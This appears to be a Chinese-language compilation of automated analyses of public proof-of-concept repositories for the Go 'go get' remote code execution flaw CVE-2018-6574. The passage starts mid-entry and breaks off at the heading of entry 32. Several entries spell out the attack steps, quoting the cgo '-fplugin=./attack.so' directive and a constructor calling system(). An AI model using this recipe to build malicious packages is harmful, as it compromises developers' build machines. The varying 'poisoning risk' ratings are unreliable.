**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 受害者使用存在漏洞的 Go 版本，并且运行 `go get` 获取恶意代码。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 允许攻击者通过 `go get` 命令执行远程代码。具体利用方式如下：

1.  **攻击者创建恶意 Go 包：** 攻击者创建一个包含恶意代码的 Go 包，利用 gcc 或 clang 插件特性。 在提供的POC代码中,attack.c 文件定义了一个 `malicious()` 函数，该函数被声明为 `__attribute__((constructor))`，这意味着它会在程序加载时自动执行。该函数会执行 `system("/usr/local/bin/score a321915f-37a6-465f-be95-ce9602f6a9e1")` 命令。这表明攻击者试图执行一个特定的程序 `/usr/local/bin/score`，并传递一个特定的ID作为参数。

2.  **诱导受害者获取恶意包：** 攻击者诱导受害者使用 `go get` 命令获取该恶意包。这可以通过多种方式实现，例如通过社会工程学攻击，或者将恶意包伪装成有用的工具库。

3.  **构建时执行恶意代码：** 当受害者使用 `go get` 命令获取并构建恶意包时，Go 会调用 gcc 或 clang 来编译代码。由于存在漏洞，Go 没有正确地过滤 `-fplugin=` 和 `-plugin=` 参数，导致 gcc 或 clang 加载并执行攻击者提供的恶意插件，从而执行攻击者预先设定的恶意代码。

**有效性分析：**
提供的POC代码通过构造一个包含constructor属性的C代码，在编译时自动执行恶意命令`/usr/local/bin/score a321915f-37a6-465f-be95-ce9602f6a9e1`。如果攻击者能够控制 go get 获取的源码，并在其中包含类似的代码，那么这个POC是有效的。

**投毒风险分析：**
提供的POC代码本身没有明显的投毒行为，它只是简单地执行一个命令。是否包含投毒代码需要分析 go get 获取的整个代码仓库，而不仅仅是 attack.c 这个文件。根据目前的信息，无法确定是否存在投毒风险。
提供的 attack.c 代码直接执行预设的命令，没有发现隐藏恶意行为的迹象。假设作者仅提供了已验证可复现漏洞的代码，所以判定投毒风险为0%

**利用方式总结：**
攻击者利用该漏洞，主要是利用了`go get`命令在构建过程中的不安全行为，通过`gcc`或`clang`的插件机制执行恶意代码，达到远程代码执行的目的。攻击的关键在于诱使受害者获取并构建包含恶意插件的Go包。

**项目地址:** [jftierno/-CVE-2018-6574](https://github.com/jftierno/-CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #20

**来源**: [CVE-2018-6574-jftierno_CVE-2018-6574-2.md](../2018/CVE-2018-6574-jftierno_CVE-2018-6574-2.md)

## CVE-2018-6574-Go-远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** < 1.8.7, 1.9.x < 1.9.4, 1.10 pre-releases < 1.10rc2

**利用条件:** 用户使用受影响的Go版本执行 `go get` 命令，并下载包含恶意代码的包。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-6574 允许攻击者通过 `go get` 命令执行远程代码。漏洞原因是 Go 在构建过程中没有正确过滤 gcc 或 clang 的插件参数（`-fplugin=` 和 `-plugin=`）。

**有效性：**

提供的 POC 代码 `main.go` 展示了如何利用该漏洞。代码通过 `#cgo CFLAGS: -fplugin=./attack.so` 指令引入一个恶意的 gcc 插件 `attack.so`。当 `go get` 或 `go build` 执行此代码时，gcc/clang 会尝试加载并执行 `attack.so`，从而实现远程命令执行。

**投毒风险：**

由于 POC 代码中引用了外部的 `attack.so` 文件，因此存在投毒风险。虽然代码本身只是声明和调用了一个简单的函数，但是实际的恶意代码存在于 `attack.so` 中。攻击者可以将恶意代码注入到 `attack.so` 中，从而在用户构建项目时执行任意命令。如果用户下载并使用了包含此 `main.go` 和恶意的 `attack.so` 的代码仓库，那么就会受到攻击。投毒风险评估为10%，主要因为代码本身依赖外部文件，增加了复杂性，也更容易被发现。

**利用方式：**

1.  攻击者创建一个包含恶意 `main.go` 和 `attack.so` 的 Go 项目。
2.  `main.go` 包含 `#cgo CFLAGS: -fplugin=./attack.so` 指令。
3.  `attack.so` 包含攻击者想要执行的恶意代码。
4.  攻击者将该项目托管在公共代码仓库（例如 GitHub）上。
5.  攻击者诱骗受害者使用受影响的 Go 版本执行 `go get <攻击者仓库地址>` 命令。
6.  `go get` 命令下载并构建项目，触发 gcc/clang 加载 `attack.so`。
7.  `attack.so` 中的恶意代码被执行，攻击成功。

搜索引擎结果中的 "pentesterlab.com/exercises/cve-2018-6574" 链接提供了一个练习环境，可以用来复现和理解该漏洞。

**总结：**

CVE-2018-6574 是一个严重的安全漏洞，允许攻击者利用 `go get` 命令执行任意代码。为了避免受到攻击，请确保使用最新版本的 Go，并避免下载和构建来自不可信来源的 Go 项目。

**项目地址:** [jftierno/CVE-2018-6574-2](https://github.com/jftierno/CVE-2018-6574-2)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #21

**来源**: [CVE-2018-6574-jftierno_CVE-2018-6574.md](../2018/CVE-2018-6574-jftierno_CVE-2018-6574.md)

## CVE-2018-6574-Go-远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 目标机器需要安装受影响版本的Go，并且执行`go get`命令拉取恶意代码仓库。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-6574漏洞允许攻击者在`go get`命令执行期间，通过gcc或clang插件功能执行任意命令。攻击者可以创建一个包含恶意C代码的Go项目，该C代码在编译时被执行。 

**漏洞利用方式：**
1.  攻击者创建一个包含`attack.c`和`main.go`的恶意Go项目。
2.  `attack.c`包含将在编译时执行的恶意代码，例如，利用`system`函数执行任意命令。
3.  `main.go`使用`// #cgo CFLAGS: -fplugin=./attack.so`指示Go编译器使用`attack.so`作为gcc/clang插件。
4.  当用户使用`go get`命令下载并构建该恶意项目时，`attack.c`会被编译成`attack.so`，并作为插件加载，其中的恶意代码将被执行。

**有效性：**
提供的PoC代码是有效的。`attack.c`中的`malicious()`函数使用`system()`函数执行命令`/usr/local/bin/score a321915f-37a6-465f-be95-ce9602f6a9e1`。`main.go`中的`// #cgo CFLAGS: -fplugin=./attack.so`指令使得在构建时加载`attack.so`，从而执行恶意代码。

**投毒风险：**
存在一定的投毒风险，风险占比约10%。虽然PoC的主要功能是演示漏洞利用，但攻击者可能在`attack.c`中添加额外的恶意代码，例如，植入后门、窃取敏感信息等。当前的PoC代码中`/usr/local/bin/score a321915f-37a6-465f-be95-ce9602f6a9e1` 命令比较可疑，如果`score` 命令的功能未知，那么存在潜在的风险。 此外攻击者可能在其他地方加入隐蔽的后门代码，增加了投毒的风险，所以评估投毒风险占比为10%。

**项目地址:** [jftierno/CVE-2018-6574](https://github.com/jftierno/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #22

**来源**: [CVE-2018-6574-lisu60_cve-2018-6574.md](../2018/CVE-2018-6574-lisu60_cve-2018-6574.md)

## CVE-2018-6574-go get 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致系统被完全控制

**影响版本:** < 1.8.7, 1.9.x < 1.9.4, 1.10 pre-releases < 1.10rc2

**利用条件:** 目标系统使用受影响的Go版本，且执行了`go get`命令来获取恶意代码仓库。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574允许攻击者利用`go get`命令执行任意代码。漏洞原理是由于受影响的Go版本在构建过程中没有正确过滤`-fplugin`和`-plugin`参数，攻击者可以在代码仓库中包含恶意的gcc/clang插件，当用户使用`go get`下载并构建该仓库时，恶意插件会被执行，从而实现远程命令执行。

**有效性分析：**
提供的POC代码是有效的，它演示了如何利用`-fplugin`选项执行代码。`attack.c`文件包含一个`malicious()`函数，该函数使用`system()`调用执行命令`/usr/local/bin/score cacd042c-6b75-4c9b-b52d-3ebb2f52932e`。`attack.go`文件使用`#cgo CFLAGS: -fplugin=./attack.so`指令告诉go编译器在构建过程中包含该恶意插件。

**投毒风险分析：**
代码本身没有明显的投毒迹象。`attack.c`中执行的命令`/usr/local/bin/score cacd042c-6b75-4c9b-b52d-3ebb2f52932e`看起来像是一个示例或者测试命令，用于验证漏洞是否成功利用。虽然这个命令本身可能是无害的，但攻击者可以修改`attack.c`来执行任何他们想要的恶意命令，这才是真正的风险所在。所以说，从提供的代码来看，投毒的概率为0%，但是不代表攻击者不能进行投毒。

**利用方式分析：**
1.  攻击者创建一个包含恶意代码的Go项目，其中包括`attack.c`和`attack.go`文件，以及`go.mod`文件。
2.  攻击者将该项目托管在一个公开的代码仓库中（如GitHub）。
3.  攻击者诱骗目标用户使用`go get`命令下载并构建该项目。
4.  当目标用户执行`go get`命令时，Go编译器会读取`attack.go`文件中的`#cgo CFLAGS: -fplugin=./attack.so`指令，并将`attack.so`插件加载到构建过程中。
5.  `attack.so`插件中的`malicious()`函数会被执行，从而执行攻击者预先设定的恶意命令。

**项目地址:** [lisu60/cve-2018-6574](https://github.com/lisu60/cve-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #23

**来源**: [CVE-2018-6574-markisback_CVE-2018-6574.md](../2018/CVE-2018-6574-markisback_CVE-2018-6574.md)

## CVE-2018-6574 Go "go get" 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 目标系统使用受影响的 Go 版本，并且执行了 `go get` 命令获取恶意代码。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 漏洞允许在 `go get` 命令构建源代码时执行远程命令。 这是因为 Go 在处理 gcc 或 clang 插件功能时，未正确阻止 `-fplugin=` 和 `-plugin=` 参数。攻击者可以创建一个恶意的 Go 包，其中包含一个 `attack.c` 文件，该文件使用 `__attribute__((constructor))` 定义一个在加载时自动执行的函数 `malicious()`。这个函数会执行任意命令，例如本例中的 `/usr/local/bin/score 9ba57f82-9a67-46fe-885b-682c886cb726`。 `main.go` 文件使用 `#cgo CFLAGS: -fplugin=./attack.so` 指令来编译和链接 `attack.c` 文件生成的动态链接库 `attack.so`。 当用户使用 `go get` 命令获取并构建这个恶意包时，`attack.so` 会被加载，`malicious()` 函数会被自动执行，从而导致远程命令执行。

**有效性：**提供的 POC 代码有效。当目标系统使用存在漏洞的 Go 版本并执行 `go get` 命令时，攻击者可以通过托管包含恶意代码的仓库来利用此漏洞。

**投毒风险：**提供的代码本身就是一个漏洞利用程序，而非被投毒的代码。此仓库没有发现额外的、作者隐藏的投毒代码。 该POC的主要目标是演示漏洞而不是隐藏恶意代码。因此，投毒风险评估为0%。

**利用方式：**
1.  攻击者创建一个包含恶意 `attack.c` 和 `main.go` 文件的 Go 包。
2.  `attack.c` 文件包含一个在加载时自动执行的 `malicious()` 函数，用于执行任意命令。
3.  `main.go` 文件使用 `#cgo CFLAGS: -fplugin=./attack.so` 指令来编译和链接 `attack.so`。
4.  攻击者将恶意 Go 包托管在一个公开可访问的仓库中。
5.  受害者使用 `go get` 命令获取并构建这个恶意包。
6.  在构建过程中，`attack.so` 被加载，`malicious()` 函数被执行，从而导致远程命令执行。

**项目地址:** [markisback/CVE-2018-6574](https://github.com/markisback/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #24

**来源**: [CVE-2018-6574-memmas_CVE-2018-6574.md](../2018/CVE-2018-6574-memmas_CVE-2018-6574.md)

## CVE-2018-6574 - Go "go get" 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程代码执行

**影响应用:** Go

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 目标系统需要运行受影响的Go版本，并且执行`go get`命令获取恶意代码仓库

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 漏洞允许攻击者通过 `go get` 命令执行任意代码。该漏洞源于 Go 在构建过程中没有正确过滤 gcc 或 clang 的插件参数（`-fplugin=` 和 `-plugin=`）。攻击者可以构造包含恶意 `C` 代码的 Go 项目，利用 `cgo` 特性，在 `go get` 下载并构建该项目时，`C` 代码会被编译并执行，从而实现远程命令执行。

**有效性：**
提供的 POC 代码有效。它包含一个 `exploit.c` 文件，其中定义了一个 `malicious()` 函数，该函数使用 `system()` 函数执行命令 `/usr/local/bin/score 3f9f4915-ab08-4227-9eba-830c2b3ac417`。`__attribute__((constructor))` 确保 `malicious()` 函数在加载动态链接库时自动执行。
`main.go` 文件使用 `cgo` 特性，将 `exploit.so` 作为插件编译到 Go 程序中。当 `go get` 获取并构建这个项目时，`exploit.c` 会被编译成动态链接库，并在程序加载时执行 `malicious()` 函数，从而执行预定的恶意命令。

**投毒风险：**
根据提供的代码，投毒风险为 0%。`exploit.c` 中执行的命令 `/usr/local/bin/score 3f9f4915-ab08-4227-9eba-830c2b3ac417` 明确定义，没有发现隐藏的恶意代码或者其他未知的行为。此仓库只是作为POC验证，触发执行的是给定的命令。

**利用方式：**
1.  **创建恶意 Go 项目：** 攻击者创建一个包含 `exploit.c` 和 `main.go` 文件的 Go 项目。`exploit.c` 包含要执行的恶意代码，`main.go` 使用 `cgo` 特性加载 `exploit.so`。
2.  **托管恶意项目：** 将恶意 Go 项目托管在公共代码仓库（例如 GitHub）上。
3.  **诱导受害者执行 `go get`：** 攻击者诱导受害者在其系统上执行 `go get <恶意项目URL>` 命令。
4.  **远程命令执行：** 当受害者执行 `go get` 命令时，Go 会下载并构建恶意项目。构建过程中，`exploit.c` 会被编译并执行，从而在受害者系统上执行攻击者预设的恶意命令。

**项目地址:** [memmas/CVE-2018-6574](https://github.com/memmas/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #25

**来源**: [CVE-2018-6574-mux0x_CVE-2018-6574.md](../2018/CVE-2018-6574-mux0x_CVE-2018-6574.md)

## CVE-2018-6574 Go "go get" 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，允许攻击者在构建过程中执行任意代码

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 目标系统使用受影响的Go版本，并且执行`go get`命令获取恶意代码。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 允许通过`go get`命令执行远程命令，利用了 gcc/clang 插件功能未正确过滤 `-fplugin=` 和 `-plugin=` 参数。攻击者可以创建一个包含恶意代码的Go项目，并在项目的CGO指令中指定恶意的插件。当受害者使用受影响的Go版本通过`go get`获取并构建该项目时，指定的恶意插件会被执行，从而导致远程命令执行。

分析提供的POC代码：

*   `attack.c`：这是一个 C 源代码文件，定义了一个名为 `exploit` 的函数，该函数使用 `system` 函数执行命令 `/usr/local/bin/score afd78b87-2130-4509-be41-e2bc661c338e`。`__attribute__((constructor))` 使得 `exploit` 函数在共享库加载时自动执行。
*   `main.go`：这是一个 Go 源代码文件，它使用 CGO（C Go 接口）来调用 C 代码。`// #cgo CFLAGS: -fplugin=./attack.so` 指令告诉 Go 编译器在构建过程中使用 `attack.so` 作为 gcc/clang 的插件。`attack.so` 是由 `attack.c` 编译生成的共享库。当 `go get` 构建该项目时，会编译 `attack.c` 生成 `attack.so`，然后将其作为插件加载，从而执行 `exploit` 函数中的命令。

**有效性：**

该POC代码有效。通过 `go get` 命令获取并构建包含上述代码的项目，可以触发远程命令执行。

**投毒风险：**

代码本身的功能是明确的：执行一个特定的命令。**并没有隐藏任何其他的后门代码或者恶意行为**。因此，投毒风险为 0%。

**利用方式：**

1.  攻击者创建一个包含恶意 `attack.c` 和 `main.go` 的 Go 项目。
2.  攻击者将该项目托管在公共代码仓库（如 GitHub）。
3.  攻击者诱导受害者使用受影响的 Go 版本执行 `go get <attacker's repository>` 命令。
4.  受害者的 Go 工具链在构建项目时，会加载 `attack.so` 插件，从而执行攻击者指定的任意命令。

**项目地址:** [mux0x/CVE-2018-6574](https://github.com/mux0x/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #26

**来源**: [CVE-2018-6574-paulogmota_CVE-2018-6574.md](../2018/CVE-2018-6574-paulogmota_CVE-2018-6574.md)

## CVE-2018-6574 - Go "go get" 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，允许攻击者在目标系统上执行任意代码

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 目标系统需要安装存在漏洞的Go版本，并运行 `go get` 命令尝试获取恶意代码仓库。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 漏洞存在于 Go 语言的 `go get` 命令中，允许远程命令执行。攻击者可以通过创建一个包含恶意 `.c` 文件的 Go 项目，并利用 `// #cgo CFLAGS: -fplugin=./attack.so` 指令，在目标系统执行任意命令。

**利用方式：**

1.  攻击者创建一个包含 `main.go` 和 `attack.c`（编译后的 `attack.so`）的恶意 Go 项目，其中 `attack.c` 包含要执行的恶意代码。
2.  `attack.c` 文件使用 `__attribute__((constructor))`  修饰 `malicious()` 函数，使其在动态链接库加载时自动执行。
3.  `main.go` 文件使用 `#cgo CFLAGS: -fplugin=./attack.so` 指令，告诉 `go` 命令使用 `attack.so` 作为 GCC 插件。
4.  攻击者将该项目托管到 GitHub 等代码仓库。
5.  诱骗目标用户使用 `go get github.com/<your-handle>/<your-hepo>` 命令获取该项目。
6.  当 `go get` 构建项目时，会调用 GCC 并加载 `attack.so` 插件，导致 `malicious()` 函数执行，从而执行攻击者预设的任意命令。

**有效性：**

提供的 POC 代码有效，可以复现该漏洞。

**投毒风险：**

根据提供的代码，没有发现作者隐藏的投毒代码。`attack.c` 中明确包含恶意代码，是漏洞利用的一部分，不应将其视为投毒代码。 因此，投毒风险为 0%。

**搜索引擎结果印证：**

搜索结果中，[webpage 4] 链接指向 pentesterlab 的练习，明确指出该漏洞允许攻击者通过欺骗用户安装恶意包来执行任意代码。其他的搜索结果也都表明了该漏洞的严重性。

**项目地址:** [paulogmota/CVE-2018-6574](https://github.com/paulogmota/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #27

**来源**: [CVE-2018-6574-rootxjs_CVE-2018-6574.md](../2018/CVE-2018-6574-rootxjs_CVE-2018-6574.md)

## CVE-2018-6574 - Go "go get" 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致远程代码执行和系统完全控制

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 用户使用受影响的Go版本执行 `go get` 命令获取恶意Go包。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-6574 允许通过 `go get` 命令执行远程命令。攻击者可以创建一个恶意的 Go 包，其中包含利用 gcc 或 clang 插件功能的恶意代码。当用户使用 `go get` 获取并构建此恶意包时，Go 会执行攻击者插入的恶意代码。

**有效性：**
提供的 POC 代码演示了如何利用 `-fplugin` 选项。`main.go` 文件使用 `#cgo CFLAGS: -fplugin=./attack.so` 指令，指示 Go 在编译时加载 `attack.so` 插件。如果 `attack.so` 包含恶意代码，它将在构建过程中执行。这个POC代码表明该漏洞可以被利用。

**投毒风险：**
代码中通过 `-fplugin=./attack.so` 引入外部so文件，如果该so文件不是由代码作者提供或来源不明，则存在投毒风险。虽然POC本身只是一个演示性质的例子，但是一旦被攻击者利用，替换`attack.so`，可能会导致用户在不知情的情况下运行恶意代码。投毒风险估计为10%，因为需要攻击者替换或控制`attack.so`文件。

**利用方式：**
1.  攻击者创建一个包含恶意 `attack.so` 文件的 Go 包。`attack.so` 文件包含攻击者想要执行的任意代码。
2.  攻击者将包含恶意 Go 包的仓库托管在公共服务器上。
3.  攻击者诱使用户使用 `go get` 命令获取此恶意包，例如 `go get github.com/attacker/evilpackage`。
4.  当用户运行 `go get` 命令时，Go 会下载并构建该包。由于 `main.go` 中包含 `#cgo CFLAGS: -fplugin=./attack.so` 指令，构建过程会加载并执行 `attack.so` 中的恶意代码。
5.  恶意代码在用户系统上执行，攻击者可以获得远程代码执行权限。

**项目地址:** [rootxjs/CVE-2018-6574](https://github.com/rootxjs/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #28

**来源**: [CVE-2018-6574-rootxjs_new-CVE-2018-6574.md](../2018/CVE-2018-6574-rootxjs_new-CVE-2018-6574.md)

## CVE-2018-6574 - Go "go get" 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，允许远程命令执行

**影响版本:** < 1.8.7, 1.9.x < 1.9.4, 1.10 pre-releases < 1.10rc2

**利用条件:** 需要目标机器运行受影响版本的 Go，并且使用 'go get' 命令获取恶意代码。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 漏洞允许攻击者在构建源代码期间，通过 'go get' 命令执行远程命令。这是因为受影响版本的 Go 没有阻止 `-fplugin=` 和 `-plugin=` 参数，这些参数可以被用来加载恶意的 gcc 或 clang 插件。提供的POC代码演示了如何利用此漏洞。它通过在 Go 代码中使用 `#cgo CFLAGS: -fplugin=./plugin.so` 指令来指定一个恶意的插件。当构建此代码时，go 会尝试加载 `./plugin.so`，这使得攻击者能够在目标机器上执行任意代码。根据POC代码内容分析，未发现作者隐藏的投毒代码。

**项目地址:** [rootxjs/new-CVE-2018-6574](https://github.com/rootxjs/new-CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #29

**来源**: [CVE-2018-6574-seoqqq_CVE-2018-6574.md](../2018/CVE-2018-6574-seoqqq_CVE-2018-6574.md)

## CVE-2018-6574 - Go "go get" 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致系统完全控制

**影响版本:** < 1.8.7, 1.9.x < 1.9.4, 1.10 pre-releases < 1.10rc2

**利用条件:** 用户使用受影响的 Go 版本执行 `go get` 命令从恶意仓库获取代码。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 漏洞允许攻击者利用 `go get` 命令在构建源代码时执行任意命令。该漏洞源于 Go 在处理 gcc 或 clang 插件选项时，未正确阻止 `-fplugin=` 和 `-plugin=` 参数。攻击者可以通过创建一个包含恶意代码的 Go 包，并在该包中利用 CGO 特性，将恶意的编译器选项注入到构建过程中。当用户使用受影响的 Go 版本执行 `go get` 命令来获取并构建该恶意包时，恶意代码将被执行。

**有效性分析：**
提供的 PoC 代码看起来是有效的。`main.go` 文件使用了 CGO 指令 `#cgo CFLAGS: -fplugin=./attack.so`，这正是漏洞利用的关键。这个指令告诉 Go 编译器在构建过程中加载 `attack.so` 插件。`attack.c` 文件定义了一个 `exploit` 函数，该函数使用 `__attribute__((constructor))` 属性，确保在动态链接库加载时自动执行。因此，当 `go get` 命令构建包含 `main.go` 的包时，`attack.so` 会被加载，`exploit` 函数会被执行，从而实现任意命令执行。

**投毒风险分析：**
经过对提供的代码进行分析，没有发现明显的投毒代码。`aaa.c`、`attack.c` 和 `exploit.c` 都包含执行 `/usr/local/bin/score 4a0b3a0c-6593-4414-86ca-c78649e04c0f` 命令的代码或者执行`sleep 20`的代码。这些代码是PoC本身的一部分，旨在验证漏洞。`README.md`是对漏洞的描述说明，`main.go`是触发漏洞的主代码, 所以仓库中作者隐藏的投毒代码可能性为0%。

**利用方式总结：**
1.  **创建恶意 Go 包：** 攻击者创建一个包含 `main.go` 文件的 Go 包，并在 `main.go` 文件中使用 CGO 指令 `#cgo CFLAGS: -fplugin=./attack.so`，指向包含恶意代码的动态链接库。
2.  **创建恶意动态链接库：** 攻击者创建一个动态链接库（例如 `attack.so`），该库包含在加载时自动执行的恶意代码。
3.  **托管恶意包：** 攻击者将恶意 Go 包托管在一个可以通过 `go get` 命令访问的仓库中（例如 GitHub）。
4.  **诱导用户执行 `go get`：** 攻击者诱导用户使用受影响的 Go 版本执行 `go get <malicious_package_url>` 命令来获取并构建恶意包。
5.  **执行恶意代码：** 当用户执行 `go get` 命令时，Go 编译器会加载恶意动态链接库，并执行其中的恶意代码，从而实现远程命令执行。

**项目地址:** [seoqqq/CVE-2018-6574](https://github.com/seoqqq/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #30

**来源**: [CVE-2018-6574-solovvway_CVE-2018-6574.md](../2018/CVE-2018-6574-solovvway_CVE-2018-6574.md)

## CVE-2018-6574

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程代码执行

**影响应用:** Go

**危害等级:** 高危，允许远程代码执行

**影响版本:** Go < 1.8.7, Go 1.9.x < 1.9.4, Go 1.10 pre-releases < Go 1.10rc2

**利用条件:** 目标系统需要使用受影响的Go版本，攻击者需要能够让目标系统通过`go get`获取包含恶意代码的包。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 漏洞允许攻击者在构建 Go 项目时执行任意代码。该漏洞源于 `go get` 命令在处理 gcc 或 clang 插件选项时没有正确过滤 `-fplugin` 和 `-plugin` 参数。攻击者可以通过构造包含恶意 `// #cgo CFLAGS: -fplugin=./attack.so` 的 Go 代码，诱使受害者使用 `go get` 命令下载并构建该项目。构建过程中，会加载攻击者提供的恶意插件（attack.so），从而执行任意代码。

漏洞利用方式：

1.  攻击者创建一个包含恶意代码的 Go 项目。
2.  项目中的 Go 文件包含 `// #cgo CFLAGS: -fplugin=./attack.so` 这样的注释，指定加载恶意的插件。
3.  攻击者将项目托管在公开的代码仓库中。
4.  受害者使用 `go get` 命令获取该项目。
5.  `go get` 在构建项目时，会加载并执行攻击者提供的恶意插件。

根据提供的代码，`attack.c` 文件中定义了一个名为 `malicious` 的函数，该函数使用 `system` 函数执行命令 `/usr/local/bin/score 91e025d6-94e9-4d26-8b86-c00dea0b3129`。这个命令看起来像是用于提交漏洞利用得分的，本身不包含恶意或投毒行为。`main.go` 文件则通过 cgo 技术，将 attack.so 文件编译为插件,并通过 // #cgo CFLAGS指定。

有效性：提供的POC代码有效，能实现远程代码执行。
投毒风险：在给定的代码中，没有发现明显的投毒行为。`attack.c` 中的 system 命令只是执行了一个特定的脚本，用于提交得分，没有发现进一步利用或危害系统的代码。



**项目地址:** [solovvway/CVE-2018-6574](https://github.com/solovvway/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #31

**来源**: [CVE-2018-6574-the-valluvarsploit_CVE-2018-6574.md](../2018/CVE-2018-6574-the-valluvarsploit_CVE-2018-6574.md)

## CVE-2018-6574 - Go "go get" 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 目标系统使用受影响的 Go 版本，且执行 `go get` 命令获取包含恶意代码的包。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 允许在源码构建过程中利用 gcc 或 clang 插件特性执行远程命令。漏洞原因是 Go 在执行 `go get` 时没有正确阻止 `-fplugin=` 和 `-plugin=` 参数。 

**有效性:**

提供的 POC 代码有效。`attack.c` 文件包含一个 `malicious()` 函数，该函数使用 `__attribute__((constructor))` 在程序启动时自动执行 `/usr/local/bin/score 5406e228-19be-4c56-b6da-ee36ce3dee1a` 命令。`main.go` 文件使用 `cgo` 调用 `attack.so` (由 `attack.c` 编译而来)，从而触发恶意代码执行。

**投毒风险:**

提供的代码中没有明显的投毒代码。`attack.c` 的功能很明确，就是执行一个固定的命令。`main.go` 只是为了触发 `attack.c` 中恶意函数的执行。因此，投毒风险评估为 0%。

**利用方式:**

1.  攻击者创建一个包含恶意 `attack.c` 和 `main.go` 文件的 Go 包。
2.  `attack.c` 包含在程序启动时执行任意命令的代码。
3.  `main.go` 利用 `cgo` 技术，通过 `-fplugin=` 选项加载并执行 `attack.c` 编译后的共享库。
4.  攻击者将该恶意 Go 包托管在可访问的存储库中。
5.  受害者在易受攻击的 Go 版本上使用 `go get` 命令下载并构建该恶意包。
6.  构建过程中，`attack.so` 被加载，其中的恶意代码被执行，导致远程命令执行。
7.  `/usr/local/bin/score` 命令被执行，可能导致系统受损或被控制。

**项目地址:** [the-valluvarsploit/CVE-2018-6574](https://github.com/the-valluvarsploit/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #32

**来源**: [CVE-2018-6574-tjcim_cve-2018-6574.md](../2018/CVE-2018-6574-tjcim_cve-2018-6574.md)

## CVE-2018-6574-Go远程命令执行

